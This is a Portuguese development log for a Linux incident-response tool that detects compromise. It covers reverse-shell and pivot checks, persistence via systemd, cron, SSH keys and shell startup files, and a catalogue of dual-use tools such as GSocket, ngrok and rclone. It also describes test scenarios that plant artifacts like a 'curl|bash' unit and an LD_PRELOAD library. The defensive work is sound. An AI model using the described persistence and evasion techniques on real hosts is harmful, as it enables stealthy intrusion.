O harness ganhou `ExpectOutput` para isso — asserção sobre o relatório humano,
para o que não vira achado. Sem ele, nada garantiria que o operador enxergue o
que a ferramenta descobriu.

### Onde o orçamento do `wtf` NÃO é cobrado, e por quê

O prazo é verificado na fronteira dos checks, não no meio da coleta. Uma lista
de processos pela metade quebra correlação: pivô e reverse shell dependem de
cruzar processo com socket, e cruzar com metade produz conclusão ERRADA, não
conclusão parcial. Coleta é tudo ou nada, e o que o operador recebe quando ela
demora é o tempo real impresso no RESULT.

---

## Registro — segunda revisão de código

Sete commits desde a primeira revisão. Oito problemas; o mais grave foi uma
regressão introduzida pela própria paralelização.

### 1 · CRÍTICO — panic no coletor virava exit 2, que significa "host comprometido"

Antes de a coleta ser paralela, um panic subia até o `recover()` do `main` e
virava exit 3 (ERROR). Em goroutine o recover do main **não alcança**:

```
panic em goroutine        → exit 2
panic na goroutine main   → recuperado → exit 3
```

Exit 2 é `CRITICAL — indicador de alta confiança` neste contrato. Um defeito
NOSSO faria a automação de frota marcar o host como comprometido. É a mesma
correção que o `runGuarded` fez para os checks, desfeita sem querer pela
paralelização e refeita agora com `readProcessGuarded` — e o PID que derruba o
coletor vira lacuna declarada, dizendo em voz alta que o defeito é da
ferramenta.

### 2 · ALTO — UDP não era lido, e nada declarava isso

`/proc/net/tcp{,6}` só. C2 por DNS e beacon por UDP eram invisíveis **e** os
checks de rede reportavam cobertura COMPLETA. Exatamente a mentira que a
ferramenta existe para não contar.

Agora lê `udp{,6}`. UDP não tem LISTEN nem handshake, então a direção sai de
outra pergunta: sem peer é bind (equivalente funcional de listener), com peer o
processo chamou `connect()`. Conferido contra o `ss` do host: 6 TCP estab + 2
UDP conectados = 8; 5 binds UDP fora de loopback = 5. Bate exato.

O limite que sobra está declarado nos dois checks: `sendto()` sem `connect()`
não expõe o destino, e socket RAW e unix não são lidos.

### 3 · ALTO — `sc.Err()` nunca consultado: leitura pela metade virava fato completo

`sc.Scan()` devolve false tanto no fim do arquivo quanto em erro. Processo que
morresse no meio da leitura produzia:

```
maps parcial      proc.maps_rwx_anon dizia limpo, com cobertura completa
status parcial    UID e EUID em zero — e zero é ROOT: o processo passava a ser
                  pulado por proc.caps_unexpected como root legítimo
```

Status incompleto agora invalida o processo inteiro (sem identidade não se
afirma nada sobre ele); maps incompleto marca o processo como não avaliado
**sem descartar** o que já foi encontrado — achado é achado.

### 4 · MÉDIO — socket com vários donos: o join sobrescrevia

`s.PID, s.Comm = p.PID, p.Comm` num laço sobre processos: o último ganhava. Mas
a relação é de muitos para muitos — fork herda o fd. Cenário de falha: pai com
as duas pernas faz fork, o filho fecha uma; o join dá a externa a um e a interna
a outro, e **`net.pivot` não dispara em ninguém**.

O índice passou a ser construído do lado do PROCESSO, pelos descritores — que é
como o kernel de fato relaciona os dois. Dedup por inode, para `dup2` do mesmo
socket não virar duas conexões.

### 5 · MÉDIO — `wtf --root` quebrado saía 1 em vez de 3

`scan` recusava com ERROR; `wtf` seguia e saía WARNING. Na triagem de frota
ordenada por exit code, um caminho digitado errado aparecia como host que
precisa de atenção.

### 6 · O rodapé afirmava algo que não era verdade

Os 10 checks têm `Wtf: true`, então `wtf` e `scan` rodam o mesmo conjunto — e o
rodapé mandava rodar `scan`, que não acrescentaria nada. Agora o texto depende
do tamanho do catálogo: sugere o `scan` dizendo **quantos checks a mais**, e
quando não há nenhum, não sugere. Se corrige sozinho quando a fase 4 chegar.

### 7 e 8 · contagem do corte e duas definições de loopback

A linha "e mais N achados" contava INFO, que nunca são impressos. E havia duas
respostas para "isto é loopback?" em pacotes diferentes — que precisam ser
DIFERENTES, e agora estão separadas com o motivo escrito: como peer, `0.0.0.0`
é "endereço nenhum"; como endereço local de escuta, é TODAS as interfaces, o
caso mais exposto que existe. Unificar as duas inverteria uma delas e esconderia
todo listener público.

---

## Registro — fase 4, primeira fatia (4.1 e 4.5)

Seis checks novos, 16 no total. E uma mudança de natureza: este é o primeiro
coletor **baseado em arquivo**.

### Por que isso importa mais que os seis checks

Tudo que veio antes lê `/proc`, que só existe em host vivo — e num host com
rootkit o `/proc` é justamente o que mente. Persistência é lida do disco, então
a mesma análise roda sobre uma imagem montada com `--root`, onde o kernel é o
**do analista** (runbook §35.6):

```
ao vivo    16/16 · 4 críticos · 3 avisos · exit 2
em imagem   6/16 · 3 críticos · 1 aviso  · exit 2
            os 10 de processo saem NÃO VERIFICADOS: "não se aplica ao modo image"
```

O cenário `61` existe para provar exatamente isso — não a detecção, que o `60`
já provou, mas que a análise **sobrevive ao host**.

Nada aqui chama `systemctl`. Um binário do host comprometido responde o que o
atacante quiser, e a §7.2 existe porque a unit no disco é a verdade que o
`systemctl list` pode esconder.

### O código morto da primeira revisão saiu do papel

`persist.ld_preload_global` já estava na lista de `trustBreakers` do motor desde
a fase 1, sem nenhum check que o disparasse. Agora dispara, e o relatório passa
a imprimir:

```
CONFIANÇA REBAIXADA — achados vindos de binário do host não valem como prova:
  · /etc/ld.so.preload presente: o loader injeta biblioteca em todo processo dinâmico
```

O cenário `60` trava isso com `ExpectOutput`.

### Detalhes de parsing que decidem o achado

```
continuação com "\"      cortar ali perde o ARGUMENTO, que é onde o payload mora
"ExecStart=" vazio       RESETA a lista: é assim que um drop-in SUBSTITUI o
                         comando. Guardar os dois mostraria um comando que não
                         roda mais
prefixo -, @, +, !       o systemd aceita, e eles não podem esconder o caminho
                         do binário de quem classifica
home do passwd DO ALVO   nunca do host do analista — mesma armadilha do
                         /etc/hostname que vazou na fase 1
```

O `calendarInterval` NÃO é um parser de `OnCalendar`. Ele extrai só o campo com
`*/N`, que é como se escreve "a cada N". Implementar o formato inteiro para
responder "isto é frequente?" seria trocar um sinal por um gerador de falsos
positivos.

### Um erro de modelagem que os cenários pegaram

Declarei `Optional: CapSystemd` nos três checks de unit. Resultado: **toda**
varredura de Alpine ou de contêiner saía com cobertura degradada, porque o host
não tem systemd — e 13/16 quebrou metade dos cenários de uma vez.

A modelagem certa é não declarar nada: host sem systemd não tem persistência por
unit para encontrar, então o check cobriu tudo que havia, que é nada. Alegar
lacuna ali é o mesmo gritar-lobo que a distinção entre "processo que terminou" e
"processo que não pude ler" existe para evitar.

A lacuna de VERDADE continua declarada, e vem do coletor: systemd **presente**
com nenhuma unit legível.

### O que falta da fase 4

```
4.2  cron, at, anacron — incluindo o intervalo */N
4.3  SSH: authorized_keys, sshd_config efetivo, AuthorizedKeysCommand, .ssh/rc
4.4  shell startup + BASH_ENV
4.6  rc.local, init.d, generators, PAM, udev, MOTD, hooks de pacote
4.7  CA plantada, /etc/hosts, resolver, git hooks, auto_prepend_file, metadata
4.8  supervisores (pm2, supervisord) e containers
```

O coletor de arquivo e o modo imagem já estão de pé, então o resto é
acrescentar leitura e check — sem decisão de arquitetura nova pela frente.

---

## Registro — os cenários eram de MECANISMO, não de adversário

Pergunta que motivou: **os cenários são realistas? do invasor simples ao
sofisticado?** A resposta era não, e medi em vez de argumentar.

Os 50 cenários testavam UMA forma cada: planta um mecanismo, afirma um check.
Isso é a base certa e não é a mesma coisa que um incidente — um comprometimento
real deixa cinco a dez artefatos ao mesmo tempo, no mesmo processo, com relação
causal entre eles.

### Montar o primeiro composto expôs quatro defeitos

A forma que a §5.10 descreve para a família GSocket, inteira: binário em
`~/.config/htop/defunct`, processo renomeado para `[kworker/1:2]`, saída para
relay em 443 sem listener, prefixo `GS_`/`GSOCKET_` no environ.

```
1  o bloco de ação repetia `cp /proc/20/exe` TRÊS vezes — um por check que
   disparou no mesmo pid. O bloco existe para ser a lista curta do que fazer
   agora, e virava parede. Deduplicado por comando
2  quatro achados sobre o MESMO processo, sem correlação: a ferramenta conta
   quatro fatos soltos onde há uma história. Ainda em aberto
3  GS_* e GSOCKET_* eram COLETADOS e nunca reportados. A §5.10 chama isso de
   "o atalho mais barato do runbook inteiro" — virou proc.env_tool_marker
4  proc.ld_preload_env estava na lista de trustBreakers do motor desde a fase 1
   sem check que o disparasse: o SEGUNDO trustBreaker morto. Agora existe
```

Nenhum teste de mecanismo acharia esses quatro. Só apareceram porque o composto
tem a forma de um incidente.

### O eixo que faltava inteiro: sofisticação

Tudo que eu plantava era barulhento — binário `.x` em `/tmp`, unit chamada
`updater.service` com `curl|bash`. Nunca medi o que um adversário CUIDADOSO
produz. Medindo:

```
                                 barulhento    competente
achados                          4 críticos    1 aviso
```

O competente usa `/usr/local/sbin/systemd-netlinkd`, sem `exec -a`, saída para
443 sem dup2 sobre 0/1/2, beacon de hora em hora, persistência por drop-in com
comando de aparência inocente.

**O único check que sobrevive é o do drop-in** — e ele sobrevive porque foi
construído sobre a FORMA (alguém acrescentou execução a uma unit alheia) e não
sobre o conteúdo do comando. É a lição de projeto mais cara da sessão, e ela
confirma a regra que já vinha sendo seguida em `correlate.revshell` e
`net.pivot`.

O que falta para fechar o resto NÃO são checks errados — são checks que ainda
não existem:

```
3.2       saída para IP público sem processo conhecido
fase 7    integridade: binário em /usr/local/sbin sem dono de pacote
fase 10   amostragem em janela: beacon de 1h é invisível no retrato (§2.7)
```

### O cenário 71 documenta o ponto cego, e quebra quando ele fechar

`71-adversario-competente` afirma `Exit: 1`. Quando qualquer um dos checks acima
chegar, o exit vira 2 e o cenário QUEBRA — de propósito. É assim que um ponto
cego deixa de ser esquecível: ele passa a ter um teste que anuncia a própria
morte.

---

## Registro — correlação por sujeito e famílias de ferramenta

### Correlação: uma história, não quatro fatos

O composto do gsocket expunha o defeito: quatro checks disparavam no mesmo pid e
o relatório contava quatro fatos soltos. `Report.Correlate()` separa as duas
leituras, que são diferentes e ambas necessárias:

```
por ALVO   o mesmo pid visto por checks distintos → a forma de um incidente
por ID     o mesmo check em muitos alvos → "8× exe em local suspeito"
```

O corte é em **dois checks distintos**, não em dois achados: o mesmo check
disparando duas vezes no mesmo alvo é repetição, não correlação — agrupar isso
prometeria uma história que não existe. E cada achado sai uma vez só, num lado
ou no outro.

```
⛔ pid=19        4 sinais no mesmo alvo
     · reverse shell: fd 0, 1 e 2 no mesmo socket                    §17
     · variável de ambiente que identifica a família da ferramenta   §5.10
     · processo de userspace disfarçado de thread de kernel          §3.5
     · processo executando de diretório onde nada se instala         §8
```

É decisão de EXIBIÇÃO: o JSONL não muda, senão a agregação de frota passaria a
depender de como o relatório foi renderizado (SPEC 7.1).

### Famílias: o critério de entrada é o que importa

```
só ferramenta PÚBLICA com variável DOCUMENTADA. Nada de hash, nada de nome
de amostra — isso é catálogo de antivírus, envelhece em semanas, e esta
ferramenta não tem como mantê-lo

e cada entrada precisa dizer o que o nome MUDA na resposta. Um nome que não
redireciona a investigação não paga a linha que ocupa
```

```
GSOCKET_ · GS_    CRITICAL   relay sem IP fixo: bloquear IP não resolve (§18.1)
NGROK_            WARN       túnel de INGRESSO: procurar listener (§2) não acha
TUNNEL_TOKEN      WARN       idem, cloudflared
CLOUDFLARED_      WARN       idem
RCLONE_CONFIG     WARN       exfiltração sai de "improvável" e vira "presumir" (§37)
```

Todas são ferramentas LEGÍTIMAS de uso duplo, e a severidade separa "isto nunca
é legítimo em servidor" de "a capacidade está presente e mudou o escopo".
Capacidade não é prova de uso.

### E um defeito que a heurística nova trouxe — pego por cenário

A variável é HERDADA, então toda a árvore de filhos virava achado. Passei a
reportar só a RAIZ da herança... e o cenário 70 quebrou.

Causa: **`sh -c` faz `exec` no último comando**, então a própria aletheia vira o
pai do que foi plantado na mesma sessão — e como ela herdou a variável, a
supressão apagava o achado inteiro. Enxergar e não dizer é o pior resultado
possível.

Duas correções, e a segunda é a que vale:

```
1  a própria ferramenta nunca conta como origem (pai.Self)
2  rede de segurança: se a família foi VISTA e nenhum achado saiu, ele sai
   assim mesmo, dizendo que a raiz não pôde ser isolada
```

A segunda é um invariante, não um remendo: **supressão por herança não pode
zerar um achado que existe**. A primeira sozinha corrigiria este caso e deixaria
a classe inteira em aberto.

---

## Registro — catálogo de famílias de ferramenta

Pergunta: **a CLI reconhece ferramentas conhecidas?** Reconhecia por uma rota
só. A §5.10 lista cinco, e a de variável de ambiente é a de menor alcance —
a maioria dos implantes não usa env, usa arquivo de config.

### Três rotas, uma tabela

`internal/tools` fica em pacote PRÓPRIO porque é consumido dos dois lados: o
coletor procura os artefatos em disco, o check decide o que fazer com o achado.
Se o check fosse ao filesystem sozinho, a suíte inteira deixaria de rodar sem
um host de verdade.

```
Env    prefixo de variável no environ (§3.6)      só processo vivo
Paths  config e estado em disco (§7)              funciona em IMAGEM MONTADA
Bins   nome do executável, em processo E em Exec= de unit
```

A rota de disco é a de maior alcance, e a única que atravessa a §35.6 — ler de
fora quando o userland do alvo não é confiável. A rota de unit pega a ferramenta
que **não está rodando agora mas roda no próximo boot**.

### O catálogo, e por que ele é estreito

```
GSocket / gs-netcat   ALTO   relay sem IP fixo: bloquear IP não resolve (§18.1)
XMRig                 ALTO   oportunista, mas a rota de entrada serve para outro
ngrok                 MÉDIO  túnel de INGRESSO: procurar listener (§2) não acha
cloudflared           MÉDIO  idem
frp                   MÉDIO  proxy reverso que atravessa NAT
Tailscale             MÉDIO  rede paralela que o firewall de borda não vê
rclone                MÉDIO  exfiltração sai de "improvável" e vira "presumir" (§37)
RMM (AnyDesk/…)       MÉDIO  sessão interativa com cara de software corporativo
```

Só ferramenta PÚBLICA com caminho ou variável DOCUMENTADOS. Nada de hash, nada
de nome de amostra: isso é catálogo de antivírus, envelhece em semanas, e uma
ferramenta de IR que depende de assinatura atualizada mente em silêncio quando a
assinatura ficou velha. Nome de projeto e caminho de config são estáveis por
anos — é a diferença entre catalogar SAMPLES e catalogar FERRAMENTAS.

Nenhuma delas é malware. Todas têm uso legítimo, e a severidade separa "não há
por que isto estar num servidor" de "a capacidade está presente e mudou o
escopo". Capacidade não é prova de uso.

Invariantes travados por teste: sem rota não entra, sem nota não entra (um nome
que não redireciona a investigação não paga a linha), binário não pode colidir
entre famílias, e nome genérico (`sh`, `nc`, `curl`, `python`) é recusado.

### O limite, e ele é o ponto

Reconhecer pelo NOME é trivial de burlar — renomear o binário derrota as três
rotas. Por isso o catálogo NÃO é a detecção primária: é o acelerador. Quem pega
o implante renomeado é o check ESTRUTURAL, que olha a forma:

```
correlate.revshell     fd 0,1,2 no mesmo socket
net.pivot              saída externa + saída interna
proc.kthread_disguise  cmdline vazio com exe existente
persist.unit_dropin    alguém acrescentou execução a unit alheia
```

O cenário `71-adversario-competente` prova isso: lá o binário se chama
`systemd-netlinkd`, `tool.binary` e `tool.artifact` estão no Forbid, e o que
sobrevive é o check de forma. Confundir as duas coisas levaria a "melhorar" a
ferramenta engordando a lista de nomes — a estratégia que envelhece pior.

### Três defeitos que rodar contra o desktop pegou

```
9 CRÍTICOS do Firefox   LD_PRELOAD=libmozsandbox.so é o sandbox dele. Pior:
                        ld_preload_env é trustBreaker, então TODA varredura de
                        desktop imprimiria "CONFIANÇA REBAIXADA"
```

Três correções, e as duas primeiras são gerais:

```
1  confiança só é rebaixada por achado CRÍTICO, não por suspeita
2  a raiz da herança vira o achado; os filhos viram contagem (9 → 1)
3  severidade pelo LUGAR da lib: nome relativo ou diretório de sistema é AVISO
   (instrumentação legítima), caminho gravável é CRÍTICO (é onde o atacante
   escreve)
```

E o `grouped()` do relatório passou a agrupar por ID **e severidade**: juntar um
crítico com um aviso do mesmo check imprimia `⛔ 2×`, com o cabeçalho dizendo 1
e a linha dizendo 2. Quem lê acredita na linha.

Sobra um caso declarado, não corrigido: o Android SDK faz preload de lib própria
a partir do home, e sai como CRÍTICO. Estruturalmente É a forma de um implante —
a regra está certa, e a classe está declarada nos falsos positivos.

---

## Registro — terceira revisão de código

Sete achados sobre o trabalho não commitado. O primeiro é a sina central da
ferramenta, e os outros dois de peso são a MESMA regra escapando em dois
lugares.

### 1 · Checks de persistência declaravam cobertura completa sem enxergar /root

```
como root      ⛔ 1  ⚠ 1  ·  20/20   (unit em /root/.config/systemd/user + rclone)
como uid 1000  ⛔ 0  ⚠ 0  ·   7/20   ← os 7 de persistência saíam COMPLETOS
```

O veredito geral só não mentia porque os outros 13 checks (de `/proc`) declaram
`Optional: CapRoot` e puxavam para INCOMPLETE. **Sorte, não desenho** — em modo
imagem não existe check de `/proc`, e a mesma cegueira imprimiria `7/7 · OK`.

A correção NÃO foi `Optional: CapRoot` nos checks de arquivo: em modo imagem o
analista não é root e mesmo assim lê tudo, então isso degradaria à toa. O
coletor passou a registrar a negativa ESPECÍFICA, por categoria:

```
lookup()   separa três desfechos: existe · não existe · NÃO PUDE OLHAR
           só o terceiro degrada cobertura
```

```
antes  completos 7 · parciais 0
depois completos 3 · parciais 17
       persist: 1 diretórios de unit de usuário ilegíveis: /root/.config/systemd/user
       persist: 13 caminhos de ferramenta não puderam ser lidos: /root/.config/gsocket · …
```

### 2 e 3 · A mesma regra, escapando duas vezes

```
tool.binary   cortava em 6 ocorrências sem dizer quantas havia
wtf           o teto de linhas valia só para os avulsos; os grupos
              correlacionados eram ilimitados, e o comando existe para caber
              numa tela
```

"Nunca corte silencioso" é regra que o resto do código aplica sem exceção
(`maxUnits`, `maxMapLines`, `maxFDs`, os partials do coletor). Escapou nos dois
lugares novos.

### 4 · Achado sumindo do relatório

`Correlate()` marcava o ALVO como agrupado e montava o resto por alvo. Um achado
que compartilhava o alvo sem ter entrado no grupo — um INFO — não saía no grupo
nem no resto: **sumia**. Passou a marcar por POSIÇÃO, e o teste afirma que
grupos + resto = total.

### 5 e 7 · Continuação perdida e duas implementações de agrupamento

Unit cujo arquivo termina em `\` perdia a última linha em silêncio (agora marca
`Truncated`). E existiam duas funções de agrupamento com semânticas diferentes —
`Report.Grouped()` por ID, `report.grouped()` por ID+severidade. Divergiram em
silêncio; virou uma só, `check.GroupByIDSev`.

### 6 · `Environment=` de unit

Era lacuna, não defeito: uma unit com `Environment=LD_PRELOAD=/tmp/x.so` é a
rota da §7.8 que ninguém associa a execução de código. Agora é coletada e
alimenta a MESMA lista do `/etc/environment` — um check só, uma leitura só.

### E o fix do nº 1 trouxe um falso positivo, pego pelos cenários

Três cenários quebraram: `cobertura 15/20` num Alpine limpo rodando como root.

Causa: o Alpine usa `/dev/null` como home de conta de sistema, e
`/dev/null/.config/...` devolve **ENOTDIR** — que `os.IsNotExist` não reconhece.
Todo host Alpine passaria a reportar lacuna falsa.

```
ENOTDIR = um componente do caminho não é diretório = o caminho NÃO PODE existir
```

Não é "não pude olhar". É a mesma classe de gritar-lobo que a distinção entre
"processo terminou" e "processo ilegível" existe para evitar — e foi a terceira
vez nesta sessão que ela apareceu por um caminho diferente.

Correção dupla: `lookup` trata ENOTDIR como inexistente, e `homeDirs` descarta
home que não é diretório.

---

## Registro — fase 4.2 e 4.3: cron, at e SSH

Seis checks, 26 no total. São as duas persistências mais COMUNS em invasão real
— uma linha de crontab e uma chave em `authorized_keys` — e vieram depois de
systemd só porque o coletor de unit era o mais difícil, não o mais frequente.

Tudo lido de ARQUIVO. Nada de `crontab -l`, nada de `sshd -T`: o binário do host
é justamente o que pode estar adulterado, e ler arquivo funciona sobre imagem
montada. O preço está declarado no código — `sshd -T` resolve Match blocks e
defaults compilados, e a leitura de arquivo não. O que se ganha é ver o que
está ESCRITO, que é o que alguém plantou.

### O que decidiu o desenho de cada um

```
cron_suspect    mesma pergunta do unit_exec_suspect, no outro gatilho. O cron é
                o mais usado dos dois: não precisa de systemd, não precisa de
                root para o próprio usuário, e uma linha a mais num arquivo de
                texto não chama atenção

cron_frequent   a cadência do beacon. */7 é o favorito porque sete minutos não
                casa com nenhuma janela redonda de amostragem (§2.7)

at_job          o gatilho que MAIS escapa: dispara UMA vez, no futuro. Não é
                recorrente, então não aparece em varredura de periodicidade
                nenhuma — é assim que um atacante sobrevive à limpeza. E o job
                guarda o ambiente INTEIRO de quem o criou: o SSH_CONNECTION lá
                dentro entrega o IP de origem de graça

ssh_forced_     command="..." executa a cada login com aquela chave. Quem tem a
command         chave não precisa nem de shell, e o authorized_keys continua
                parecendo um arquivo de chaves comum

sshd_key_source AuthorizedKeysFile e AuthorizedKeysCommand mudam ONDE o sshd
                procura chave. O segundo é pior: não existe arquivo de chave
                nenhum para achar

ssh_keys        MANUAL de propósito. "Esta chave é de alguém do time?" não é
                decidível por máquina — toda chave parece igual. O que a
                ferramenta pode fazer é montar a lista com o que DECIDE:
                impressão digital para comparar entre hosts, comentário para
                reconhecer a origem, data para datar a inserção
```

A impressão digital é SHA-256 no formato do `ssh-keygen`, calculada nativamente.
É o melhor IOC de frota que existe: a mesma chave em vários hosts é a mesma
pessoa, e isso vale mais que hash de binário (§23).

### Dois parsings que decidem o achado

```
formato de cron   o de SISTEMA tem um campo de usuário a mais que o de usuário.
                  Confundir faz o nome do usuário virar o começo do comando, e o
                  comando de verdade some do relatório

opções de chave   vêm ANTES do tipo, separadas por vírgula, e podem conter
                  espaço dentro de aspas: command="/bin/x -a b",no-pty. Cortar
                  por espaço perderia metade da opção — que é onde mora o gatilho
```

### Duas isenções, ambas achadas rodando contra ambiente real

**`AuthorizedKeysCommand` do Arch.** O Manjaro entrega
`/usr/bin/userdbctl ssh-authorized-keys %u` de fábrica, via
`sshd_config.d/20-systemd-userdb.conf` — e o parser seguiu os includes
corretamente, então o achado estava CERTO. Disparar em todo host Arch é ruído.
Isentadas as integrações de diretório conhecidas (systemd-userdb, SSSD, OS Login
do GCE, EC2 Instance Connect) **quando o programa está em diretório de sistema**:
um `userdbctl` em /tmp não herda reputação nenhuma. Mesma regra do runtime com
JIT.

**O agendador do Alpine.** Contêiner limpo disparava `cron_frequent`: a crontab
de fábrica tem `*/15 run-parts /etc/periodic/15min`. Duas correções:

```
run-parts sobre /etc/periodic ou /etc/cron.* é plumbing da distribuição, e o
que esses diretórios contêm já é coletado como entrada própria

o limite virou ESTRITO: 15 minutos é cadência redonda, e cadência redonda é o
que manutenção legítima usa. O favorito do beacon é o número que não casa com
janela nenhuma
```

Depois das duas: zero falso positivo contra o host real e contra a matriz.

### Estado

26 checks, 59 cenários. Falta da fase 4: 4.4 (shell startup), 4.6 (rc.local,
PAM, udev, generators), 4.7 (CA plantada, hosts, git hooks, metadata de nuvem),
4.8 (supervisores e containers).

---

## Registro — fase 4.4 e 4.6: gatilhos de execução

Cinco checks, 31 no total. O que junta um `.bashrc`, uma regra de udev e um hook
do apt é a mesma pergunta: **QUANDO isto roda**.

Por isso `When` virou CAMPO do modelo, não comentário: um achado em
`/etc/profile.d` vale para TODO usuário, e um em `~/.zshenv` roda até em shell
não interativo. São alcances diferentes, e o relatório precisa dizer qual — o
operador usa isso para saber o que já rodou desde a invasão.

```
.bashrc              shell INTERATIVO — a cada login SSH, o favorito
.zshenv              SEMPRE em zsh, inclusive não interativo — o mais forte
BASH_ENV             shell NÃO interativo: script, cron, scp, comando remoto
/etc/profile.d/*     shell de login, para TODO usuário
rc.local             no boot, SE tiver bit de execução
/etc/init.d/*        vira unit pelo systemd-sysv-generator, e NÃO aparece em
                     /etc/systemd/system
pam.d                a cada autenticação — o caminho que vê a senha
udev                 em evento de dispositivo: sem horário, sem login, fora de
                     toda correlação temporal
generator            em todo boot e reload, ANTES das units
```

### Duas informações que a §7.6 dá de graça

```
diff contra /etc/skel   o esqueleto é a versão que a distribuição copiou para
                        cada home. O que sobra foi ACRESCENTADO — baseline sem
                        precisar de baseline
posição no arquivo      o .bashrc de distro tem dezenas de linhas e ninguém rola
                        até o fim. Acrescentar lá embaixo é o padrão do `echo >>`
```

As duas entram na evidência. `Tail` só é marcado em arquivo com mais de seis
linhas de conteúdo — "no fim" não significa nada num arquivo de duas, e o
cenário precisou plantar um `.bashrc` REALISTA para exercitar isso.

### `rc.local` sem bit de execução

Detalhe que decide, e que virou severidade: sem `+x` o arquivo é INERTE.
Reportar como crítico algo que não roda desperdiça a atenção; omitir também
erra, porque um `chmod +x` o ativa e o ctime data isso. Sai como AVISO dizendo
que hoje não roda.

### Dois falsos positivos contra o host real, com causas diferentes

**`/etc/profile.d/gpm.sh`** de qualquer Arch. A linha é
`/dev/tty[0-9]*) [ -n "$(pidof -s gpm)" ] && …` — um padrão de `case`, não um
comando. O classificador de caminho é compartilhado com as units, onde o
primeiro token É um executável; em linha de SHELL pode ser sintaxe.

Correção na raiz: `pareceCaminho` recusa token com metacaractere de shell
(`*?[]()|;&$"'` e crase). É um teste de "isto não pode ser caminho de
executável", não um remendo para um arquivo.

**`systemd-debug-generator`** — que é um **ELF**. Eu estava fatiando um binário
em linhas, e `TTYPath=/dev/%s` no meio do código virava achado. O coletor passou
a detectar binário pela mesma heurística do `grep` (byte NUL nos primeiros 512),
e o arquivo continua registrado como gatilho — a existência é o fato — sem
linhas para avaliar.

### Estado

31 checks, 61 cenários, zero falso positivo contra o host real. Falta da fase 4:
4.7 (CA plantada, hosts, resolver, git hooks, metadata de nuvem) e 4.8
(supervisores e containers).

---

## Registro — fase 4.7 e 4.8: confiança, deploy e supervisores

Quatro checks, 35 no total. Fecha a fase 4 no que é lido de arquivo.

### O MITM que não faz barulho

CA plantada e `/etc/hosts` moram no mesmo arquivo do coletor de propósito:
separá-las esconderia que o valor está na COMBINAÇÃO. Juntas, o nome resolve
para o atacante e o certificado dele é aceito — não há erro de TLS, processo
estranho nem porta aberta. **Nenhuma ferramenta reclama.**

O certificado é decodificado NATIVAMENTE (`crypto/x509`), não pelo `openssl` do
host: o que se quer saber é em quem o host passou a confiar, e perguntar isso ao
binário do host seria perguntar ao suspeito. Titular, emissor, auto-assinatura e
validade entram na evidência.

Em `/etc/hosts`, a severidade sai do DESTINO e do NOME:

```
destino privado          aviso — espelho de pacote e registro interno são comuns
destino público          crítico — o nome deixou de resolver pelo DNS
domínio de ATUALIZAÇÃO   crítico mesmo com destino interno: quem controla para
                         onde o deb.debian.org aponta controla o que o host instala
```

### O ponto cego que virou pergunta

`persist.cloud_metadata` é MANUAL, e é o único check que existe para declarar
uma **ausência**. O startup-script da instância não está em disco nenhum: não há
arquivo, cron nem unit, e ele roda como root a cada boot — inclusive depois de
trocar o disco.

Reportar silêncio ali como "nada encontrado" seria a mentira exata que esta
ferramenta existe para não contar. Então o achado é a PERGUNTA, com o comando
pronto — e só aparece quando há agente de nuvem no host ou virtualização
detectada.

### A primeira busca em ÁRVORE do coletor

Hook de git é persistência que **sobrevive ao redeploy** e não mora em `/etc`.
Achá-lo exige caminhar a árvore, o que até agora nenhum coletor fazia.

O orçamento saiu de medição, não de palpite:

```
400 diretórios   ~45ms de coleta
2000             ~150ms
4000             ~200ms
```

Ficou em 2000. Mas o que decide mais que o teto é a **ordem**: as raízes de
deploy (`/srv`, `/opt`, `/var/www`, `/data`) vêm ANTES dos homes, então uma
estação de trabalho com mil repositórios nunca deixa `/var/www` de fora — que é
onde a §7.12 diz que o hook importa.

Estourar o teto vira lacuna DECLARADA, e no host real ela aparece:
`a busca por hooks de git parou em 2000 diretórios`.

### `auto_prepend_file`: o sinal é a DIRETIVA

Diferente dos outros gatilhos, aqui o caminho apontado pode parecer
perfeitamente normal. O que importa é que alguém pôs código no caminho de TODA
requisição — o docroot fica limpo e a busca por webshell da §16 não acha nada.
Mesma lógica do drop-in de systemd: o sinal é a forma, não o conteúdo.

### Estado

35 checks, 63 cenários, zero falso positivo contra o host real. `wtf` em 176ms.

A fase 4 fecha aqui no que é legível de arquivo. Ficou de fora, e está
registrado: `docker diff` e restart policy de container (4.8) precisam falar com
o runtime, o que pertence à fase 12; e contas na camada de dados (§7.12) exigem
credencial de banco, que a ferramenta não tem e não deve pedir.

---

## Registro — o que uma invasão REAL expôs

A pergunta foi: **no mundo real, a CLI detecta?** Montei uma cadeia completa em
vez de uma forma isolada — entrada, payload, persistência redundante e canal,
cada peça escolhida para parecer legítima sozinha:

```
entrada       chave SSH acrescentada, sem command=
payload       /usr/local/sbin/systemd-oomd-helper — nome e caminho plausíveis
persistência  unit habilitada com Restart=always
              @reboot no crontab do root
              linha no /root/.bashrc
C2            saída para IP público em 443
```

Resultado com 35 checks: **`RESULT: OK`**. Um achado manual, zero automáticos.

E o pior: **os dados estavam todos coletados**. Duas units referenciando o
payload, um arquivo de shell, três conexões. A ferramenta tinha tudo para ligar
os pontos e não tinha check que ligasse.

### O viés de sobrevivência da própria suíte

Os cenários eram realistas por MECANISMO, mas todo cenário positivo plantava um
payload que os checks já sabiam ver. A suíte provava que os checks disparam no
que foram desenhados para pegar — não media o que um adversário faz.

### Os dois checks que fecham a cadeia, e por que são estruturais

```
correlate.persistence_redundant   três mecanismos apontando para o MESMO alvo
integrity.no_package_owner        nenhum pacote reivindica este binário
```

Nenhum dos dois olha nome, caminho ou conteúdo. Renomear o binário, movê-lo para
outro diretório de sistema ou trocar o payload não muda nada — é a mesma
propriedade que fez `revshell`, `pivot` e `dropin` sobreviverem a todos os
testes desta sessão.

O primeiro sai do runbook §19: software de pacote se agenda de UM jeito, e quem
se persiste de vários está se protegendo da SUA limpeza. O achado é o roteiro de
remoção — sobrando um mecanismo, ele volta.

Depois dos dois: `OK` → `CRITICAL` correlacionado no caminho do payload, com os
dois sinais se reforçando.

### Integridade: NATIVO, não `dpkg -V`

A SPEC previa chamar o binário do host e marcar `origin:tool`. Mas dpkg e apk
guardam a lista de arquivos em TEXTO:

```
dpkg   /var/lib/dpkg/info/*.list     um caminho absoluto por linha
apk    /lib/apk/db/installed         F: fixa o diretório, R: é o arquivo
rpm    base binária                  → NÃO SEI, dito em voz alta
```

Ler texto é mais barato que gerenciar desconfiança: o resultado vale como prova
e funciona sobre imagem montada. No CentOS a resposta é a lacuna declarada —
`63 binários em execução NÃO foram verificados` —, e o cenário 27 trava isso.

**A armadilha era o usrmerge.** O dpkg lista `/bin/cat` e o processo roda
`/usr/bin/cat`. Sem casar as duas grafias, TODO binário de /usr/bin apareceria
sem dono — falso positivo catastrófico em todo Debian moderno. Testado contra um
